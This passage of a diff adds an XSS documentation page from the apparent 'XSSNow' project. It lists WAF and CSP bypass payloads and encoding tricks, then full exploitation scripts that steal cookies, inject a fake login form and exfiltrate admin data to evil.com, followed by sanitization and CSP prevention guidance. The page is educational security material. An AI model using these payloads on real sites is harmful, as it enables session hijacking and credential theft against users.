+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+
+# Template literals
+&lt;script&gt;alert`1`&lt;/script&gt;</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="waf-card aws">
+                            <h4>🌩️ AWS WAF Bypasses</h4>
+                            <div class="code-example">
+                                <pre><code># Mixed case with spaces
+&lt; ScRiPt &gt;alert(1)&lt;/ ScRiPt &gt;
+
+# Alternative tags
+&lt;svg onload=alert(1)&gt;
+&lt;iframe src=javascript:alert(1)&gt;
+
+# Event handler variations
+&lt;img src=x oNlOaD=alert(1)&gt;
+&lt;body oNlOaD=alert(1)&gt;</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="waf-card modsecurity">
+                            <h4>🔒 ModSecurity Bypasses</h4>
+                            <div class="code-example">
+                                <pre><code># Comment injection
+&lt;script&gt;/**/alert(1)&lt;/script&gt;
+&lt;script&gt;alert/**/('1')&lt;/script&gt;
+
+# String concatenation
+&lt;script&gt;alert('1'+'')&lt;/script&gt;
+&lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt;
+
+# Alternative execution
+&lt;script&gt;Function('alert(1)')()&lt;/script&gt;</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="csp-bypasses" class="subsection">
+                    <h3>Content Security Policy (CSP) Bypasses</h3>
+                    <p>CSP is a powerful defense mechanism, but certain configurations can be bypassed:</p>
+
+                    <div class="csp-bypass-techniques">
+                        <div class="csp-technique">
+                            <h4>📦 JSONP Endpoints Abuse</h4>
+                            <p>If CSP allows certain domains, look for JSONP endpoints that can be abused:</p>
+                            <div class="code-example">
+                                <pre><code># Google APIs
+&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"&gt;&lt;/script&gt;
+
+# AngularJS CDN
+&lt;script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"&gt;&lt;/script&gt;
+&lt;div ng-app ng-csp ng-click=$event.view.alert(1337)&gt;Click me&lt;/div&gt;</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="csp-technique">
+                            <h4>🔗 Base Tag Injection</h4>
+                            <p>Manipulate relative URLs by injecting a base tag:</p>
+                            <div class="code-example">
+                                <pre><code>&lt;base href="//evil.com/"&gt;
+&lt;script src="./legitimate-script.js"&gt;&lt;/script&gt;</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="csp-technique">
+                            <h4>📝 Nonce/Hash Bypasses</h4>
+                            <p>When nonces or hashes are used, look for ways to predict or reuse them:</p>
+                            <div class="code-example">
+                                <pre><code># Nonce reuse
+&lt;script nonce="abc123"&gt;alert(1)&lt;/script&gt;
+
+# Hash collision
+&lt;script&gt;alert(1)//[...]&lt;/script&gt;</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="encoding-tricks" class="subsection">
+                    <h3>Advanced Encoding Techniques</h3>
+                    <p>Various encoding methods can help bypass filters that don't properly decode input:</p>
+
+                    <div class="encoding-techniques">
+                        <div class="encoding-card">
+                            <h4>🔢 Numeric Character References</h4>
+                            <div class="code-example">
+                                <pre><code># Decimal encoding
+&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;
+
+# Hexadecimal encoding
+&amp;#x3C;script&amp;#x3E;alert(1)&amp;#x3C;/script&amp;#x3E;
+
+# Mixed encoding
+&amp;#60;scr&amp;#x69;pt&amp;#62;alert(1)&amp;#60;/script&amp;#62;</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="encoding-card">
+                            <h4>🌐 Unicode Normalization</h4>
+                            <div class="code-example">
+                                <pre><code># Unicode normalization bypass
+&lt;script&gt;alert\u0028\u0031\u0029&lt;/script&gt;
+
+# Unicode overlong encoding
+&lt;script&gt;eval('\\u{61}\\u{6C}\\u{65}\\u{72}\\u{74}(1)')&lt;/script&gt;
+
+# Surrogate pairs
+&lt;script&gt;alert\uD83D\uDE00&lt;/script&gt;</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="encoding-card">
+                            <h4>📦 Base64 and Alternative Encodings</h4>
+                            <div class="code-example">
+                                <pre><code># Base64 payload
+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+
+# Binary encoding
+&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;
+
+# Octal encoding
+&lt;script&gt;eval('\141\154\145\162\164\50\61\51')&lt;/script&gt;</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="encoding-card">
+                            <h4>⚡ Alternative Execution Methods</h4>
+                            <div class="code-example">
+                                <pre><code># Template literals
+&lt;script&gt;alert`1`&lt;/script&gt;
+&lt;script&gt;alert\x60${1}\x60&lt;/script&gt;
+
+# Function constructor
+&lt;script&gt;Function('alert(1)')()&lt;/script&gt;
+&lt;script&gt;[].constructor.constructor('alert(1)')()&lt;/script&gt;
+
+# setTimeout with string
+&lt;script&gt;setTimeout('alert(1)',0)&lt;/script&gt;
+&lt;script&gt;setInterval('alert(1)',1000)&lt;/script&gt;</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Exploitation Section -->
+            <section id="exploitation" class="doc-section">
+                <h2 class="section-title">🐛 XSS Exploitation Techniques</h2>
+                <p class="section-subtitle">Understanding how XSS vulnerabilities can be exploited helps in both attack and defense scenarios.</p>
+
+                <div id="session-hijacking" class="subsection">
+                    <h3>Session Hijacking</h3>
+                    <p>One of the most common and dangerous XSS exploitation techniques involves stealing user session cookies:</p>
+
+                    <div class="exploitation-method">
+                        <h4>🍪 Cookie Theft</h4>
+                        <div class="code-example">
+                            <div class="code-header">
+                                <span>Basic Cookie Stealing Payload</span>
+                                <button class="copy-code" onclick="copyCode(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </div>
+                            <pre><code class="language-javascript">// Simple cookie exfiltration
+&lt;script&gt;
+  var img = new Image();
+  img.src = 'https://evil.com/steal.php?cookie=' + document.cookie;
+&lt;/script&gt;
+
+// Advanced cookie theft with user info
+&lt;script&gt;
+  fetch('https://evil.com/collect', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      cookies: document.cookie,
+      url: window.location.href,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    })
+  });
+&lt;/script&gt;</code></pre>
+                        </div>
+
+                        <div class="mitigation-box">
+                            <h5>🛡️ Prevention Measures</h5>
+                            <ul>
+                                <li>Set <code>HttpOnly</code> flag on sensitive cookies</li>
+                                <li>Use <code>SameSite</code> cookie attribute</li>
+                                <li>Implement proper session validation</li>
+                                <li>Use short session timeouts</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="phishing-attacks" class="subsection">
+                    <h3>Phishing Attacks via XSS</h3>
+                    <p>XSS can be used to create convincing phishing attacks that appear to originate from the trusted domain:</p>
+
+                    <div class="exploitation-method">
+                        <h4>🎣 Fake Login Forms</h4>
+                        <div class="code-example">
+                            <div class="code-header">
+                                <span>Phishing Form Injection</span>
+                                <button class="copy-code" onclick="copyCode(this)">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </div>
+                            <pre><code class="language-javascript">// Inject fake login form
+&lt;script&gt;
+// Hide original content
+document.body.innerHTML = '';
+
+// Create fake login form
+var form = `
+&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999"&gt;
+  &lt;div style="max-width:400px;margin:100px auto;padding:20px;border:1px solid #ccc"&gt;
+    &lt;h2&gt;Session Expired - Please Login&lt;/h2&gt;
+    &lt;form id="phishForm"&gt;
+      &lt;input type="email" placeholder="Email" id="email" required&gt;&lt;br&gt;&lt;br&gt;
+      &lt;input type="password" placeholder="Password" id="password" required&gt;&lt;br&gt;&lt;br&gt;
+      &lt;button type="submit"&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/div&gt;
+&lt;/div&gt;`;
+
+document.body.innerHTML = form;
+
+// Capture credentials
+document.getElementById('phishForm').onsubmit = function(e) {
+  e.preventDefault();
+  var email = document.getElementById('email').value;
+  var password = document.getElementById('password').value;
+
+  // Send to attacker's server
+  fetch('https://evil.com/harvest', {
+    method: 'POST',
+    body: JSON.stringify({email, password, site: location.hostname})
+  }).then(() => {
+    window.location = '/login?expired=1';
+  });
+};
+&lt;/script&gt;</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="privilege-escalation" class="subsection">
+                    <h3>Privilege Escalation</h3>
+                    <p>XSS can sometimes be leveraged to escalate privileges within an application:</p>
+
+                    <div class="exploitation-method">
+                        <h4>👑 Admin Panel Access</h4>
+                        <div class="code-example">
+                            <pre><code class="language-javascript">// Attempt to access admin functionality
+&lt;script&gt;
+// Check if user has admin access
+fetch('/admin/dashboard')
+  .then(response =&gt; {
+    if (response.ok) {
+      // User has admin access, perform privileged actions
+      fetch('/admin/users', {method: 'GET'})
+        .then(r =&gt; r.json())
+        .then(users =&gt; {
+          // Exfiltrate user data
+          fetch('https://evil.com/admin-data', {
+            method: 'POST',
+            body: JSON.stringify(users)
+          });
+        });
+    }
+  })
+  .catch(() =&gt; {
+  });
+&lt;/script&gt;</code></pre>
+                        </div>
+                    </div>
+
+                </div>
+            </section>
+
+            <!-- Prevention Section -->
+            <section id="prevention" class="doc-section">
+                <h2 class="section-title">🔒 XSS Prevention Strategies</h2>
+
+                <div id="input-validation" class="subsection">
+                    <h3>Input Validation & Sanitization</h3>
+                    <div class="prevention-grid">
+                        <div class="prevention-card">
+                            <h4>✅ Server-Side Validation</h4>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>PHP Example - Input Sanitization</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code class="language-php">&lt;?php
+// Whitelist approach
+function sanitizeInput($input) {
+    // Remove all HTML tags
+    $input = strip_tags($input);
+
+    // Convert special characters
+    $input = htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+
+    // Additional validation
+    if (!preg_match('/^[a-zA-Z0-9\s\-_.]+$/', $input)) {
+        throw new InvalidArgumentException('Invalid characters detected');
+    }
+
+    return $input;
+}
+
+// Usage
+$userInput = sanitizeInput($_POST['username']);
+echo "Hello " . $userInput;
+?&gt;</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="prevention-card">
+                            <h4>🛡️ Client-Side Validation</h4>
+                            <div class="code-example">
+                                <div class="code-header">
+                                    <span>JavaScript Example - DOMPurify</span>
+                                    <button class="copy-code" onclick="copyCode(this)">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                                <pre><code class="language-javascript">// Using DOMPurify for client-side sanitization
+import DOMPurify from 'dompurify';
+
+function sanitizeHTML(dirty) {
+    // Configure DOMPurify
+    const clean = DOMPurify.sanitize(dirty, {
+        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
+        ALLOWED_ATTR: ['href'],
+        ALLOW_DATA_ATTR: false
+    });
+
+    return clean;
+}
+
+// Usage
+const userInput = document.getElementById('userInput').value;
+const sanitized = sanitizeHTML(userInput);
+document.getElementById('output').innerHTML = sanitized;</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="output-encoding" class="subsection">
+                    <h3>Context-Aware Output Encoding</h3>
+                    <p>Different contexts require different encoding strategies:</p>
+
+                    <div class="encoding-contexts">
+                        <div class="context-card">
+                            <h4>📝 HTML Context</h4>
+                            <div class="code-example">
+                                <pre><code class="language-javascript">// HTML Entity Encoding
+function htmlEncode(str) {
+    return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#x27;');
+}</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="context-card">
+                            <h4>🔗 URL Context</h4>
+                            <div class="code-example">
+                                <pre><code class="language-javascript">// URL Encoding
+function urlEncode(str) {
+    return encodeURIComponent(str);
+}
+
+// Usage in href attributes
+const userUrl = urlEncode(userInput);
+element.href = 'https://example.com/redirect?url=' + userUrl;</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="context-card">
+                            <h4>📜 JavaScript Context</h4>
+                            <div class="code-example">
+                                <pre><code class="language-javascript">// JavaScript String Escaping
+function jsEscape(str) {
+    return str
+        .replace(/\\/g, '\\\\')
+        .replace(/'/g, "\\'")
+        .replace(/"/g, '\\"')
+        .replace(/\n/g, '\\n')
+        .replace(/\r/g, '\\r')
+        .replace(/\t/g, '\\t');
+}</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="context-card">
+                            <h4>🎨 CSS Context</h4>
+                            <div class="code-example">
+                                <pre><code class="language-javascript">// CSS Escaping
+function cssEscape(str) {
+    return str.replace(/[^a-zA-Z0-9]/g, function(match) {
+        return '\\' + match.charCodeAt(0).toString(16) + ' ';
+    });
+}</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="csp-implementation" class="subsection">
+                    <h3>Content Security Policy Implementation</h3>
+                    <div class="csp-examples">
+                        <div class="csp-level">
+                            <h4>🔰 Basic CSP</h4>
+                            <div class="code-example">
+                                <pre><code># Basic protection
+Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="csp-level">
+                            <h4>🔵 Intermediate CSP</h4>
+                            <div class="code-example">
+                                <pre><code># More restrictive
+Content-Security-Policy:
+    default-src 'none';
+    script-src 'self' 'unsafe-inline';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data: https:;
+    connect-src 'self';</code></pre>
+                            </div>
+                        </div>
+
+                        <div class="csp-level">
+                            <h4>🔴 Strict CSP</h4>
+                            <div class="code-example">
+                                <pre><code># Maximum security
+Content-Security-Policy:
+    default-src 'none';
+    script-src 'self' 'nonce-{random}';
+    style-src 'self' 'nonce-{random}';
+    img-src 'self';
+    connect-src 'self';
+    form-action 'self';
+    base-uri 'self';</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tools & Resources Section -->
+            <section id="tools-resources" class="doc-section">
+                <h2 class="section-title">🛠️ Tools & Resources</h2>
+
+                <div class="tools-section">
+                    <div class="tool-category">
+                        <h3>🔍 Testing Tools</h3>
+                        <div class="tools-list">
+                            <div class="tool-item">
+                                <h4>Burp Suite Professional</h4>
+                                <p>Industry-standard web application security testing platform with advanced XSS detection capabilities.</p>
+                                <a href="https://portswigger.net/burp" target="_blank" class="tool-link">Visit Website</a>
+                            </div>
+                            <div class="tool-item">
+                                <h4>OWASP ZAP</h4>
+                                <p>Free, open-source web application security scanner with automated XSS detection.</p>
+                                <a href="https://owasp.org/www-project-zap/" target="_blank" class="tool-link">Visit Website</a>
+                            </div>
+                            <div class="tool-item">
+                                <h4>XSSStrike</h4>
+                                <p>Advanced XSS detection suite with intelligent payload generation and DOM analyzer.</p>
+                                <a href="https://github.com/s0md3v/XSStrike" target="_blank" class="tool-link">GitHub Repository</a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="tool-category">
+                        <h3>🛡️ Defense Libraries</h3>
+                        <div class="tools-list">
+                            <div class="tool-item">
+                                <h4>DOMPurify</h4>
+                                <p>Fast, tolerant XSS sanitizer for HTML, MathML and SVG.</p>
+                                <a href="https://github.com/cure53/DOMPurify" target="_blank" class="tool-link">GitHub Repository</a>
+                            </div>
+                            <div class="tool-item">
+                                <h4>OWASP Java HTML Sanitizer</h4>
+                                <p>Fast and easy to configure HTML Sanitizer written in Java.</p>
+                                <a href="https://owasp.org/www-project-java-html-sanitizer/" target="_blank" class="tool-link">OWASP Project</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- References Section -->
+            <section id="references" class="doc-section">
+                <h2 class="section-title">📚 References & Credits</h2>
+
+                <div class="references-section">
+                    <div class="reference-category">
+                        <h3>📖 Official Documentation</h3>
+                        <ul class="reference-list">
+                            <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10 Web Application Security Risks</a></li>
+                            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS Prevention Cheat Sheet</a></li>
+                            <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN - Content Security Policy (CSP)</a></li>
+                            <li><a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank">CWE-79: Cross-site Scripting</a></li>
+                        </ul>
+                    </div>
+
+                    <div class="reference-category">
+                        <h3>🔬 Research Papers</h3>
+                        <ul class="reference-list">
+                            <li><a href="https://www.usenix.org/conference/usenixsecurity20/presentation/somé" target="_blank">"Same Origin Policy: Evaluation in Modern Browsers" - USENIX Security 2020</a></li>
+                            <li><a href="https://research.google/pubs/pub48021/" target="_blank">"CSP Is Dead, Long Live CSP!" - Google Research</a></li>
+                            <li><a href="https://www.ndss-symposium.org/ndss-paper/postcards-from-the-post-xss-world/" target="_blank">"Postcards from the Post-XSS World" - NDSS 2018</a></li>
+                        </ul>
+                    </div>
+
+                    <div class="reference-category">
+                        <h3>🎓 Educational Resources</h3>
+                        <ul class="reference-list">
+                            <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger Web Security Academy - XSS</a></li>
+                            <li><a href="https://www.exploit-db.com/" target="_blank">Exploit Database - XSS Examples</a></li>
+                            <li><a href="https://github.com/payloadbox/xss-payload-list" target="_blank">PayloadBox - XSS Payload List</a></li>
+                        </ul>
+                    </div>
+
+                    <div class="reference-category">
+                        <h3>👥 Community & Contributors</h3>
+                        <div class="contributors-section">
+                            <p>This documentation is based on research and contributions from the security community:</p>
+                            <ul class="reference-list">
+                                <li><strong>OWASP Foundation</strong> - Web application security standards</li>
+                                <li><strong>PortSwigger Research Team</strong> - Web security research and tools</li>
+                                <li><strong>Google Security Team</strong> - CSP development and research</li>
+                                <li><strong>Mozilla Security Team</strong> - Web platform security</li>
+                                <li><strong>Security Researchers Worldwide</strong> - Bug bounty hunters and penetration testers</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="acknowledgments">
+                    <h3>🙏 Acknowledgments</h3>
+                    <p>Special thanks to the security research community for their continuous efforts in making the web safer. This documentation compiles knowledge from years of security research, responsible disclosure, and community collaboration.</p>
+
+                </div>
+            </section>
+
+            <div class="section-navigation">
+                <button class="nav-btn prev" onclick="previousSection()">
+                    <i class="fas fa-chevron-left"></i>
+                    Previous
+                </button>
+                <button class="nav-btn next" onclick="nextSection()">
+                    Next
+                    <i class="fas fa-chevron-right"></i>
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>🥷 XSSNow</h3>
+                    <p>The most comprehensive XSS payload database for ethical security research and education.</p>
+                    <div class="github-star">
+                        <a href="https://github.com/dr34mhacks/xssnow" target="_blank" class="star-btn">
+                            <i class="fas fa-star"></i> Leave us a star
+                        </a>
+                    </div>
+                </div>
+
+                <div class="footer-section">
+                    <h4>Resources</h4>
+                    <ul>
+                        <li><a href="payloads.html">XSS Payloads</a></li>
+                        <li><a href="xss-payload-generator.html">Payload Generator</a></li>
+                        <li><a href="docs.html">Documentation</a></li>
+                        <li><a href="contributors.html">Contributors</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-section">
+                    <h4>Docs</h4>
+                    <ul>
+                        <li><a href="docs.html#fundamentals">XSS Fundamentals</a></li>
+                        <li><a href="docs.html#bypass-techniques">Bypass Techniques</a></li>
+                        <li><a href="docs.html#waf-bypasses">WAF Bypasses</a></li>
+                        <li><a href="docs.html#prevention">Prevention Guide</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-section">
+                    <h4>Contribute</h4>
+                    <ul>
+                        <li><a href="https://github.com/dr34mhacks/xssnow" target="_blank">GitHub Repository</a></li>
+                        <li><a href="https://github.com/dr34mhacks/xssnow/issues" target="_blank">Report Issues</a></li>
+                        <li><a href="https://github.com/dr34mhacks/xssnow/blob/main/CONTRIBUTING.md" target="_blank">Add Payloads</a></li>
+                        <li><a href="contributors.html">Join Community</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="footer-text">
+                    <p>&copy; 2026 XSSNow. Built with ❤️ by <a href="https://www.linkedin.com/in/sid-j0shi/" target="_blank" style="color: var(--neon-green); text-decoration: none;">Sid Joshi</a> (dr34mhacks)</p>
+                    <p class="disclaimer">⚠️ For educational and ethical security testing only. Use responsibly.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="js/seo-framework.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="js/docs.js"></script>
+    <script src="js/animations.js" defer></script>
+
+    <!-- Performance Monitoring -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js');
+        }
+    </script>
+    <script src="js/author.js"></script>
+</body>
+</html>
